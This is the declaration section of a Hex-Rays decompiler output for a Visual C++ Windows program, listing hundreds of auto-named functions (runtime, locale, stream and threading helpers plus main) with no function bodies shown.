/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

u_long sub_401000();
u_long sub_401020();
u_long sub_401040();
int sub_401060();
int sub_4010A0();
int sub_4010C0();
int sub_4010E0();
int sub_4010F0();
int sub_401160();
int sub_4011D0();
int sub_401250();
int sub_4012A0();
int sub_4012C0();
int sub_401320();
int sub_401385();
int sub_40139B();
void *sub_4013F4();
int sub_4013FE();
int sub_401414();
int sub_401420();
void *sub_40142C();
int sub_401436();
int sub_40144C();
int sub_401525();
int sub_401544();
void *sub_40157E();
int sub_401588();
int sub_40159E();
int sub_4015AA();
int sub_4015C0();
FILE *sub_4015CC();
uintptr_t sub_4015DA();
void sub_4015E5();
void *sub_401600();
int __cdecl sub_401610(char *Buffer, size_t BufferCount, char *Format, _locale_t Locale, va_list ArgList);
int sub_401650(char *a1, size_t a2, char *a3, ...);
int __fastcall sub_401670(void *a1, size_t Size, void *Src, size_t Sizea);
char *__thiscall sub_401710(char *this, int a2);
char *__thiscall sub_401780(char *this, int a2);
const char *__thiscall sub_401830(_DWORD *this);
char *__thiscall sub_4018A0(char *this, int a2);
_DWORD *__thiscall sub_401930(_DWORD *this, char a2);
int __thiscall sub_4019A0(_DWORD *this);
bool __thiscall sub_4019F0(char *this, int a2);
int __thiscall sub_401A40(char *this);
char *__thiscall sub_401A90(char *this);
int __thiscall sub_401AF0(int this, const char *a2);
void __thiscall sub_401BC0(int this);
char *__thiscall sub_401CC0(char *this, int a2);
void __thiscall sub_401D40(_DWORD *this);
_DWORD *__thiscall sub_401D50(_DWORD *this, char a2);
void __thiscall sub_401D80(volatile signed __int32 *this);
volatile signed __int32 *__thiscall sub_401D90(volatile signed __int32 *this);
void __thiscall sub_401DB0(_DWORD *this);
void __thiscall sub_401E00(_DWORD *this);
_DWORD *__thiscall sub_401E50(_DWORD *this, char a2);
wchar_t *__cdecl sub_401EC0(char *a1, int a2, _Cvtvec *a3);
void __thiscall sub_401FA0(_DWORD *this);
char sub_402000();
int sub_402010();
_DWORD *__thiscall sub_402020(_DWORD *this, char a2);
int __thiscall sub_402090(int this, int a2, const char *a3, const char *a4, const char **a5, wchar_t *a6, wchar_t *a7, wchar_t **a8);
int __thiscall sub_402150(char *this, mbstate_t *a2, wchar_t *a3, wchar_t *a4, wchar_t **a5, char *a6, char *a7, void **a8);
int __thiscall sub_402260(int this, mbstate_t *a2, void *a3, int a4, void **a5);
int __thiscall sub_402320(char *this, int a2, char *a3, char *a4, unsigned int a5);
int __cdecl UserMathErrorFunction();
_DWORD *__thiscall sub_4023E0(_DWORD *this, char a2);
void __thiscall sub_402460(_DWORD *this);
_DWORD *__thiscall sub_4024C0(_DWORD *this, char a2);
int __thiscall sub_402530(int this, unsigned __int8 a2);
_BYTE *__thiscall sub_402550(char *this, _BYTE *a2, unsigned int a3);
int __thiscall sub_4025A0(int this, unsigned __int8 a2);
_BYTE *__thiscall sub_4025C0(char *this, _BYTE *a2, unsigned int a3);
int __stdcall sub_402620(void *Src, int a2, void *a3);
int __stdcall sub_402660(void *Src, int a2, int a3, void *a4);
void *__thiscall sub_402690(void *this, char a2);
bool __thiscall sub_402740(int this, unsigned __int16 a2, wchar_t a3);
const wchar_t *__thiscall sub_402760(int this, wchar_t *a2, wchar_t *a3, __int16 *a4);
unsigned __int16 *__thiscall sub_402790(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4);
unsigned __int16 *__thiscall sub_4027D0(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4);
wchar_t __thiscall sub_402810(int this, wchar_t a2);
wchar_t *__thiscall sub_402830(char *this, wchar_t *a2, unsigned int a3);
wchar_t __thiscall sub_402880(int this, wchar_t a2);
wchar_t *__thiscall sub_4028A0(char *this, wchar_t *a2, unsigned int a3);
__int16 __thiscall sub_4028F0(int this, char a2);
char *__thiscall sub_402950(char *this, char *a2, unsigned int a3, int a4);
char __thiscall sub_4029F0(int this, wchar_t a2, char a3);
wchar_t *__thiscall sub_402A40(char *this, wchar_t *a2, unsigned int a3, char a4, int a5);
void **__thiscall sub_402AE0(void **this, char a2);
bool __thiscall sub_402BA0(void *this, int a2, _DWORD *a3);
bool __thiscall sub_402BE0(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_402C10(_DWORD *this);
_DWORD *__cdecl sub_402C50(_DWORD *a1, int a2);
// int __userpurge sub_402C90@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, _DWORD *a5);
_DWORD *__thiscall sub_402F00(_DWORD *this, char a2);
int __thiscall sub_402F70(_DWORD *this);
_DWORD *__thiscall sub_402FC0(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_4030B0(_DWORD *this, char a2);
int __thiscall sub_403120(_DWORD *this);
const char *sub_403170();
int __stdcall sub_403180(int a1, int a2);
void *__thiscall sub_403210(void *this, char a2);
const char *sub_403230();
int __stdcall sub_403240(int a1, int a2);
const char *sub_403310();
int __stdcall sub_403320(int a1, DWORD a2);
void *sub_403560();
_DWORD *__thiscall sub_403590(_DWORD *this, char *a2, int *a3);
int __thiscall sub_4036A0(_DWORD *this, char a2, char a3);
int __thiscall sub_403720(_DWORD *this, int a2);
void __thiscall sub_403780(struct std::ios_base *this);
struct std::locale::_Locimp *__thiscall sub_4037C0(_DWORD *this);
_DWORD *__thiscall sub_403840(_DWORD *this, char a2);
int __thiscall sub_4038B0(_DWORD *this);
char *__thiscall sub_403900(char *this, int a2);
char *__thiscall sub_403960(char *this, int a2);
char *__thiscall sub_403A00(char *this, int a2);
struct std::ios_base *__thiscall sub_403A90(struct std::ios_base *this, char a2);
bool __cdecl sub_403AF0(char a1, FILE *Stream);
bool __cdecl sub_403B10(wchar_t Character, FILE *Stream);
int __cdecl sub_403B30(__int64 a1);
bool __stdcall sub_403C10(__int16 a1);
void __noreturn sub_403C30(void); // weak
_DWORD *__fastcall sub_403C60(_DWORD *a1, int a2);
int __cdecl sub_403CA0(int a1, int a2);
unsigned __int16 *__fastcall sub_403CE0(int a1, unsigned __int16 *a2);
int __thiscall sub_403E20(const WCHAR *this, int a2);
int __thiscall sub_403F60(int *this, char *a2, int a3);
int __thiscall sub_404120(_DWORD *this, int a2);
int __thiscall sub_404290(_DWORD *this);
// int __userpurge sub_404330@<eax>(int a1@<ecx>, int a2@<ebp>, _DWORD *a3, WCHAR *a4, int a5, int a6);
_DWORD *__thiscall sub_4044B0(_DWORD *this);
int __fastcall sub_4044C0(int a1, const WCHAR *a2, const WCHAR *a3, void *Src, size_t Size);
_DWORD *__thiscall sub_404760(_DWORD *this, char a2);
int __thiscall sub_404790(_DWORD *this);
int __thiscall sub_4048F0(int this, _DWORD *a2);
void __fastcall __noreturn sub_404980(void *a1, int a2, WCHAR *a3, int a4);
void __fastcall __noreturn sub_404A10(int a1, int *a2, WCHAR *a3, int a4);
bool __thiscall sub_404AA0(WCHAR *this);
__int64 __thiscall sub_404B60(WCHAR *this);
bool __thiscall sub_404BC0(WCHAR *this);
int __thiscall sub_404C10(int this);
unsigned int *__cdecl sub_404C40(unsigned int *a1);
int __cdecl sub_404D40(_Mtx_t a1);
int __cdecl sub_404D70(_Mtx_t a1);
int __cdecl sub_404DA0(int a1, struct _Mtx_internal_imp_t *a2);
void __thiscall sub_404DD0(_Cnd_t *this);
void __thiscall sub_404E20(_Mtx_t *this);
int __thiscall sub_404E70(int this);
void __thiscall sub_404F50(_DWORD *this);
unsigned int __stdcall sub_405000(void (__thiscall ***a1)(_DWORD));
int __thiscall sub_405020(_Thrd_t *this);
void __thiscall sub_405090(_Mtx_t this);
int __thiscall sub_4050D0(_DWORD *this);
char *__thiscall sub_405180(char *this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_4051F0(_DWORD *this);
_DWORD *__thiscall sub_405200(_DWORD *this, char a2);
char *__thiscall sub_405230(char *this, _DWORD *a2);
_DWORD *__thiscall sub_4052B0(_DWORD *this, char a2);
int __thiscall sub_405310(_DWORD *this);
char *__thiscall sub_405360(char *this, _DWORD *a2);
char *__thiscall sub_4053E0(char *this, _DWORD *a2);
char *__thiscall sub_405460(char *this, _DWORD *a2);
int __thiscall sub_4054F0(void *this, _DWORD *a2, int a3, int a4);
int __cdecl sub_4059C0(void *a1, int a2, int a3);
_DWORD *__thiscall sub_405A50(_DWORD *this, char a2);
_DWORD *__thiscall sub_405A80(_DWORD *this, char a2);
int __thiscall sub_405AE0(_DWORD *this);
char *__thiscall sub_405B30(char *this, _DWORD *a2);
char *__thiscall sub_405BE0(char *this, int a2);
char *__thiscall sub_405C80(char *this, int a2);
void __noreturn sub_405D10(); // weak
char *__thiscall sub_405D70(char *this, int a2);
int __stdcall sub_405E10(int a1);
int __stdcall sub_405E80(int a1);
bool __thiscall sub_405EF0(void *this, int a2);
int __thiscall sub_405F10(void *this);
void __thiscall __noreturn sub_405F20(void *this, int a2, int a3);
char sub_405F90();
int __thiscall sub_405FA0(void *this);
void __noreturn sub_405FB0(); // weak
int __stdcall sub_406010(_DWORD *a1);
int __thiscall sub_406030(int *this, int a2);
int __thiscall sub_406050(void *this, int a2, int a3, int a4);
int __thiscall sub_406070(int *this, int a2);
int __thiscall sub_406090(void *this, int a2, int a3, int a4);
int __thiscall sub_4060C0(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_4060F0(void *this, int a2, int a3, int a4, int a5);
char *__thiscall sub_406120(char *this);
__int64 sub_406130();
void __noreturn sub_406150(); // weak
int __thiscall sub_4061B0(void *this);
char __stdcall sub_4061C0(int a1);
_DWORD __stdcall nullsub_1(_DWORD); // weak
int __thiscall sub_4061E0(void *this);
int __thiscall sub_4061F0(void *this);
void __noreturn sub_406200(); // weak
char *__thiscall sub_406260(char *this, _DWORD *a2);
void __thiscall sub_4062F0(_DWORD *this);
int __thiscall sub_406340(void *this, int a2, int a3);
void __noreturn sub_4063C0(); // weak
_DWORD *__thiscall sub_406420(_DWORD *this, char a2);
char *__thiscall sub_406480(char *this, int a2);
char *__thiscall sub_406520(char *this, int a2);
void __cdecl __noreturn sub_4065C0(int a1, int a2);
int __thiscall sub_406620(void *this);
int __thiscall sub_406630(void *this);
int __thiscall sub_406640(void *this);
int __thiscall sub_406650(_BYTE *this);
BOOL __thiscall sub_406660(_BYTE *this);
int __stdcall sub_406670(int a1, _DWORD *a2, int a3, int a4);
int __stdcall sub_406690(int a1, int a2, int a3, int a4, int a5, int a6);
void __thiscall sub_4066A0(int this);
// int __userpurge sub_406720@<eax>(int a1@<ecx>, int a2@<ebp>, const char *a3);
int __thiscall sub_406980(const char **this);
const char **__thiscall sub_406A10(const char **this, char a2);
char *__thiscall sub_406A40(char *this, int a2);
int __thiscall sub_406AE0(_DWORD *this);
void __thiscall sub_406B30(_DWORD *this);
void *__thiscall sub_406BA0(void *this, char a2);
int __thiscall sub_406C20(_DWORD *this);
void __thiscall sub_406C70(_DWORD *this);
int __thiscall sub_406D10(int *this, char *a2, int a3, int a4, int a5);
int __thiscall sub_406D30(int *this, char *a2, int a3, int a4, int a5);
char __thiscall sub_406D50(_BYTE *this);
int __thiscall sub_406D60(_DWORD *this);
int __thiscall sub_406D70(_DWORD *this);
int __thiscall sub_406D80(_DWORD *this);
int __thiscall sub_406D90(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_406DB0(void *this);
_DWORD _guard_check_icall_nop(); // weak
int __stdcall sub_406DD0(int a1, int a2);
_DWORD *__thiscall sub_406DE0(_DWORD *this, char a2);
void __thiscall sub_406E10(_DWORD *this);
void __thiscall sub_406E70(_DWORD *this);
_DWORD *__thiscall sub_406EE0(_DWORD *this, char a2);
int __thiscall sub_406F60(_DWORD **this, int a2, int a3);
_DWORD *__thiscall sub_406F80(_DWORD *this, char a2);
void __thiscall sub_407010(_DWORD *this);
_DWORD *__thiscall sub_407080(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_407110(_DWORD *this, char a2);
void *__thiscall sub_4071A0(void *this, char a2);
void __thiscall sub_4071C0(_DWORD *this);
int __thiscall sub_407220(_DWORD *this);
int __thiscall sub_407280(_DWORD *this);
_DWORD *__thiscall sub_4072D0(_DWORD *this, _DWORD *a2, int a3, int a4);
_DWORD *__thiscall sub_4074E0(_DWORD *this, char a2);
int __thiscall sub_407560(_DWORD *this);
char __thiscall sub_4075C0(_DWORD *this);
_DWORD *__thiscall sub_407610(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_407680(_DWORD *this, char a2);
char __thiscall sub_4076F0(int this);
char __fastcall sub_4077B0(int a1);
char __fastcall sub_407820(int a1);
char __fastcall sub_407890(int a1);
char __fastcall sub_407900(int a1);
int __thiscall sub_407970(int this, char a2);
void __thiscall sub_407A20(int this);
_DWORD *__thiscall sub_407AB0(_DWORD *this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_407B90(_DWORD *this, char a2);
void __thiscall sub_407BF0(_DWORD *this);
_DWORD *__thiscall sub_407C40(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_407D20(_DWORD *this, char a2);
int __thiscall sub_407D90(_DWORD *this);
int __thiscall sub_407DE0(void *this);
int __thiscall sub_407DF0(_DWORD **this);
int __thiscall sub_407E00(_DWORD **this);
int __thiscall sub_407E10(_DWORD **this);
int __thiscall sub_407E20(_DWORD **this);
int __thiscall sub_407E30(_DWORD **this);
int __thiscall sub_407E40(_DWORD *this);
int __thiscall sub_407E50(_DWORD *this, int a2);
void __thiscall sub_407ED0(int this);
int __thiscall sub_407F60(_DWORD *this);
int __thiscall sub_407F70(_DWORD *this);
int __thiscall sub_407F80(_DWORD *this);
int __thiscall sub_407F90(void *this, int a2, int a3);
void __thiscall sub_407FB0(_DWORD *this);
_DWORD *__thiscall sub_408010(_DWORD *this, char a2);
// _DWORD *__userpurge sub_4080A0@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3, int a4, int a5);
_DWORD *__thiscall sub_4082A0(_DWORD *this, char a2);
void __thiscall sub_408330(_DWORD *this);
_DWORD *__thiscall sub_4083B0(_DWORD *this, char a2);
void __thiscall sub_408460(_DWORD *this);
void __thiscall sub_408480(int this);
int __thiscall sub_408500(_DWORD *this, int a2);
int __thiscall sub_408650(_DWORD *this, int a2);
int __thiscall sub_4086B0(void *this);
int __thiscall sub_4086C0(void *this);
int __thiscall sub_4086D0(void *this);
int __thiscall sub_4086E0(void *this);
int __thiscall sub_408700(void *this);
int sub_408720();
int sub_408730();
int sub_408740();
__int64 sub_408750();
__int64 sub_408760();
char *__thiscall sub_408770(char *this);
_DWORD *__thiscall sub_408780(void *this, _DWORD *a2);
_DWORD *__thiscall sub_408820(void *this, _DWORD *a2);
int __thiscall sub_4088C0(void *this, int a2, int a3, int a4);
int __thiscall sub_408920(void *this, int a2, int a3, int a4);
void __stdcall sub_408980(int a1, int a2, int a3, int a4, int a5, char a6);
bool __stdcall sub_4089B0(const char *a1);
void __thiscall sub_408A00(_DWORD *this);
_DWORD *__thiscall sub_408AA0(_DWORD *this, char a2);
char __stdcall sub_408AF0(int a1);
char __stdcall sub_408B10(int *a1);
_DWORD *__thiscall sub_408B30(_DWORD *this, char a2);
void __thiscall sub_408B70(_DWORD *this);
_DWORD *__thiscall sub_408BD0(_DWORD *this, char a2);
_DWORD *__thiscall sub_408C50(_DWORD *this, _DWORD *a2);
void __thiscall sub_408CB0(int *this, int *a2);
void __thiscall sub_408CC0(int *this, int a2);
void __thiscall sub_408CD0(int *this, int *a2);
void __thiscall sub_408CE0(int *this, int a2);
_DWORD *__stdcall sub_408CF0(_DWORD *a1);
_DWORD *__thiscall sub_408D50(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_408FA0(_DWORD *this);
_DWORD *__thiscall sub_409010(_DWORD *this, int a2);
_DWORD *__thiscall sub_409080(_DWORD *this, char a2);
// int __usercall sub_409110@<eax>(int a1@<ecx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, wchar_t *a5, int a6, int a7, int a8, int a9, unsigned int a10, _BYTE *a11, int a12, int a13, int a14, int a15, unsigned int a16, _BYTE *a17, int a18, int a19, int a20, int a21, unsigned int a22, _BYTE *a23, int a24, int a25, int a26, int a27, unsigned int a28, _BYTE *a29, int a30, int a31, int a32, int a33, unsigned int a34);
_DWORD *__thiscall sub_409E80(_DWORD *this);
void __thiscall sub_409F50(_DWORD *this);
void __thiscall sub_409FC0(_DWORD *this);
void __thiscall sub_40A070(_DWORD *this);
_DWORD *__thiscall sub_40A110(_DWORD *this, int a2);
int __thiscall sub_40A1D0(_DWORD *this);
int __thiscall sub_40A220(_DWORD *this);
void __thiscall sub_40A280(char *this);
_DWORD *__thiscall sub_40A330(_DWORD *this, char a2);
_DWORD *__thiscall sub_40A3B0(_DWORD *this);
void __thiscall sub_40A540(_DWORD *this);
void __thiscall sub_40A600(_DWORD *this);
_DWORD *__thiscall sub_40A650(_DWORD *this, char a2);
int __thiscall sub_40A6C0(_DWORD *this);
int __thiscall sub_40A7A0(_DWORD *this);
void __thiscall sub_40A800(_DWORD *this);
void __thiscall sub_40A870(_DWORD *this);
_DWORD *__thiscall sub_40A8C0(_DWORD *this, char a2);
void __thiscall sub_40A940(_DWORD *this);
void __thiscall sub_40A9B0(_DWORD *this);
void __thiscall sub_40AA00(_DWORD *this);
// int __usercall sub_40AAB0@<eax>(int a1@<ecx>, int a2@<ebp>, wchar_t *a3, int a4, int a5, int a6, int a7, unsigned int a8, _BYTE *a9, int a10, int a11, int a12, int a13, unsigned int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26, int a27, int a28, _BYTE *a29, int a30, int a31, int a32, int a33, unsigned int a34);
int __cdecl sub_40B670(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
// int __usercall sub_40C100@<eax>(int a1@<edi>, _DWORD *a2, _BYTE *a3, int a4, int a5, int a6, int a7, unsigned int a8, _BYTE *a9, int a10, int a11, int a12, int a13, unsigned int a14, int a15, _BYTE *a16, int a17, int a18, int a19, int a20, unsigned int a21, _BYTE *a22, int a23, int a24, int a25, int a26, unsigned int a27);
int __cdecl sub_40CBC0(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
int __cdecl sub_40D600(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
int __cdecl sub_40E040(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
int __cdecl sub_40E9E0(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
int __cdecl sub_40F410(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
int *__thiscall sub_40FE30(int *this);
void sub_40FF70();
int __cdecl sub_410330(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, _BYTE *a14, int a15, int a16, int a17, int a18, unsigned int a19, _DWORD *a20, int a21, int a22, int a23, unsigned int a24, unsigned int a25);
int __cdecl sub_410A50(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
int __cdecl sub_4114D0(_DWORD *a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, int a14, _BYTE *a15, int a16, int a17, int a18, int a19, unsigned int a20, _BYTE *a21, int a22, int a23, int a24, int a25, unsigned int a26);
void *__thiscall sub_411E60(void *this);
_DWORD *__cdecl sub_411FA0(__int64 a1, _BYTE *a2, int a3, int a4, int a5, int a6, unsigned int a7, _BYTE *a8, int a9, int a10, int a11, int a12, unsigned int a13, char *a14, int a15, int a16, int a17, int a18, unsigned int a19);
int __thiscall sub_412F60(_DWORD *this);
void __thiscall sub_413070(void **this);
void __thiscall sub_413190(void **this);
int __thiscall sub_413270(_DWORD *this);
void __thiscall sub_413320(void **this);
void __thiscall sub_4133A0(_DWORD *this);
// unsigned int *__usercall sub_413430@<eax>(int a1@<ecx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, _BYTE *a5, int a6, int a7, int a8, int a9, unsigned int a10, __int64 a11);
void __thiscall sub_414850(char *this);
_DWORD *__thiscall sub_414900(_DWORD *this, int a2);
int __thiscall sub_414A90(_DWORD *this);
_DWORD *__thiscall sub_414AF0(_DWORD *this, char a2);
int __thiscall sub_414B60(_DWORD *this);
void __cdecl sub_414D70(_BYTE *a1, int a2, int a3, int a4, int a5, unsigned int a6, _BYTE *a7, int a8, int a9, int a10, int a11, unsigned int a12);
int __cdecl main(int argc, const char **argv, const char **envp);
void __noreturn sub_417020(); // weak
void __noreturn sub_417040(); // weak
int __thiscall sub_417050(_DWORD *this, _DWORD *a2);
void __thiscall sub_417090(_DWORD *this);
_DWORD *__thiscall sub_417130(_DWORD *this, unsigned int a2);
void __thiscall sub_417180(void **this);
void __thiscall sub_417200(_DWORD *this);
void __thiscall sub_417280(int *this);
int *__thiscall sub_4172C0(int *this, int a2, int a3);
void __thiscall sub_417360(int *this);
int __stdcall sub_417410(int a1);
int __thiscall sub_417470(_DWORD *this);
int sub_417480();
int __thiscall sub_417490(_DWORD *this);
int __thiscall sub_4174A0(_DWORD *this);
char *__thiscall sub_4174B0(char *this);
int __thiscall sub_4174C0(_DWORD *this);
_DWORD *__thiscall sub_417520(int this);
char *__thiscall sub_417620(char *this);
_DWORD *__thiscall sub_417630(_DWORD *this, int a2);
int __thiscall sub_4176D0(_DWORD *this);
int __thiscall sub_4176E0(_DWORD *this);
int __thiscall sub_4176F0(_DWORD *this);
int __thiscall sub_417700(_DWORD *this);
void __thiscall sub_417710(_DWORD *this);
_DWORD *sub_4177A0();
_DWORD *sub_4177C0();
int sub_4178C0();
int __thiscall sub_4178D0(void *this, unsigned int a2);
int __thiscall sub_417900(void *this, int a2);
int __thiscall sub_417930(_DWORD *this);
int __thiscall sub_4179D0(int *this);
int __thiscall sub_417A90(_DWORD *this);
int __thiscall sub_417AB0(_DWORD *this, int a2);
int __thiscall sub_417B10(_DWORD *this, int a2);
char *__thiscall sub_417D60(char *this);
void __thiscall sub_417D70(_DWORD *this);
int __thiscall sub_417DD0(_DWORD *this, int a2);
int __thiscall sub_417E30(_DWORD *this);
int __thiscall sub_417E50(_DWORD *this);
int __thiscall sub_417E60(_DWORD *this);
void __thiscall sub_417E70(int this);
void __thiscall sub_417F40(int this);
int __thiscall sub_417FD0(_DWORD *this);
int __thiscall sub_417FE0(_DWORD *this);
bool __thiscall sub_417FF0(_DWORD *this);
int __thiscall sub_418020(char *this, int a2);
int __thiscall sub_418050(char *this, unsigned int *a2, int a3);
int __thiscall sub_418080(_DWORD *this, int a2, int a3);
int __thiscall sub_4180B0(_DWORD *this);
int __thiscall sub_4180C0(int this, int a2);
void __thiscall sub_4181B0(_DWORD *this);
_DWORD *__thiscall sub_418270(_DWORD *this);
int __stdcall sub_4183A0(int a1);
int __thiscall sub_418410(_DWORD *this);
int sub_418420();
int __thiscall sub_418430(char *this);
int __thiscall sub_4184A0(_DWORD *this);
_DWORD *__thiscall sub_4184B0(_DWORD **this);
__m128i *__thiscall sub_4184C0(int **this, int *a2);
int __thiscall sub_4184E0(int this);
int sub_418580();
int __thiscall sub_418590(void *this);
int __thiscall sub_418600(_DWORD *this);
void __noreturn sub_418660(); // weak
char __stdcall sub_418690(int a1, int a2);
int __thiscall sub_4186A0(_DWORD *this, char *a2, size_t a3, int a4, int a5);
int __thiscall sub_418710(void *this, int a2);
_DWORD *__thiscall sub_4187A0(_DWORD *this, int a2);
char __thiscall sub_4187D0(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_4188A0(void *this, int a2, int a3, int a4);
void *__thiscall sub_4188C0(int this, int a2);
char __thiscall sub_4189B0(unsigned int *this, void *a2, int a3, _DWORD *a4);
int __thiscall sub_418AC0(int this, int a2);
char __thiscall sub_418B70(unsigned int *this, void *a2, int a3, unsigned int *a4);
char __thiscall sub_418BD0(int this, int a2);
char __thiscall sub_418C80(unsigned int *this, void *a2, int a3, _DWORD *a4);
void __thiscall sub_418CE0(int this);
_DWORD *__thiscall sub_418D50(_DWORD *this, _DWORD *a2);
int __stdcall sub_418DA0(int a1);
int __stdcall sub_418E10(unsigned int a1);
int sub_418E50();
void __thiscall sub_418E60(int this);
void __thiscall sub_418EE0(_DWORD *this, size_t a2);
int __thiscall sub_418F60(_DWORD *this, void *a2, size_t a3);
void __thiscall sub_419010(_DWORD *this);
_DWORD *__thiscall sub_419060(_DWORD *this, size_t a2);
int __thiscall sub_4190D0(_DWORD *this);
int __thiscall sub_4190E0(_DWORD *this, int a2);
void __noreturn sub_4190F0(); // weak
void __thiscall sub_419120(_Mtx_t *this);
void __thiscall sub_419170(void **this);
int __thiscall sub_4191C0(char *this, const unsigned __int16 *a2, int a3);
void __thiscall sub_419280(void **this, unsigned int a2);
void **__thiscall sub_419320(void **this, __int16 a2);
void **__thiscall sub_419370(int this, void *Src, unsigned int a3);
int __thiscall sub_4193E0(_DWORD *this);
int __thiscall sub_419470(int this, int a2);
int __thiscall sub_4194E0(int this, void *a2);
_DWORD *__thiscall sub_419530(_DWORD *this, _DWORD *Src);
int __thiscall sub_419610(_DWORD *this, int a2, unsigned int a3, size_t a4);
void __thiscall sub_4196B0(void **Src, unsigned int a2);
void **__thiscall sub_419820(char *this, unsigned int a2, char a3);
void **__thiscall sub_4198A0(char *this, const char *Src);
void **__thiscall sub_419910(char *this, _DWORD *Src);
int __thiscall sub_419990(int this, char a2);
void __thiscall sub_4199E0(_DWORD *this);
_DWORD *__thiscall sub_419A60(_DWORD *this, _QWORD *a2);
_DWORD *__thiscall sub_419B10(_DWORD *this, int a2);
int __thiscall sub_419B50(int this, size_t a2, char a3);
int __thiscall sub_419B80(int this, void *a2);
_DWORD *__thiscall sub_419BC0(_DWORD *this);
_DWORD *__thiscall sub_419BE0(_DWORD *this, _DWORD *Src);
_DWORD *__thiscall sub_419CB0(_DWORD *this, wchar_t *a2, int a3, int a4, int a5);
int __thiscall sub_419E10(_BYTE *this);
_DWORD *__thiscall sub_419E50(_DWORD *this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_419ED0(_DWORD *this, wchar_t *a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_419FE0(_DWORD *this, int a2);
int __thiscall sub_41A020(FILE **this);
int *__thiscall sub_41A060(int *this, char *Buffer, __int64 a3);
int __thiscall sub_41A0C0(int this, int a2, __int64 a3, __int64 a4, int a5, int a6, int a7);
int __thiscall sub_41A1B0(int this, int a2, __int64 a3, int Origin, int a5);
int __thiscall sub_41A2B0(void *this, char *Src, __int64 a3);
int __thiscall sub_41A390(void *this, _WORD *a2, __int64 a3);
wint_t __thiscall sub_41A480(int this);
__int16 __thiscall sub_41A740(_DWORD **this);
wint_t __thiscall sub_41A780(int this, wint_t Character);
wchar_t __thiscall sub_41A850(int this, wchar_t Character);
void __thiscall sub_41A9C0(FILE **this);
void __thiscall sub_41A9D0(FILE **this);
void __thiscall sub_41A9E0(_DWORD *this);
int __thiscall sub_41AAA0(_DWORD *this);
// int __userpurge sub_41AB40@<eax>(int a1@<ecx>, int a2@<ebp>, int a3);
int __thiscall sub_41ACE0(_DWORD *this);
int __thiscall sub_41AD00(_DWORD *this);
void *__thiscall sub_41AD20(void *this, int a2, int a3, int a4);
int __stdcall sub_41AD30(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
int __stdcall sub_41AD60(int a1, int a2, int a3, int a4, int a5);
int __thiscall sub_41AD90(void *this, char *Src, __int64 a3);
int __thiscall sub_41AE80(void *this, _WORD *a2, __int64 a3);
int __thiscall sub_41AF70(_DWORD **this);
int __stdcall sub_41AFB0(int a1);
void __thiscall sub_41AFC0(_DWORD *this);
void __thiscall sub_41B030(struct std::ios_base *this);
int __thiscall sub_41B090(FILE **this);
_DWORD *__thiscall sub_41B100(_DWORD *this, wchar_t *a2, int a3, int a4, int a5);
